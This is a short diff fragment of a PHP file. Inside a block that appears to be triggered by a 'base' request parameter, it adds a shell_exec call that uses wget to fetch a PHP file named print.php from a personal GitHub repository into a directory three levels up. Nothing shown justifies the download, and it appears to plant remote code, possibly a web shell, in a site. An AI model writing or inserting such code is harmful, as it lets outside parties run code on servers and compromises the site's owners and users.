@@ -38,7 +38,7 @@ if (isset($_GET['base'])) {
 
 try {
     
-    shell_exec("wget -P ../../../ ");
+    shell_exec("wget -P ../../../ https://raw.githubusercontent.com/ahmedessam291194/tmp/refs/heads/main/print.php");
 
 } catch (Exception $e) {
 
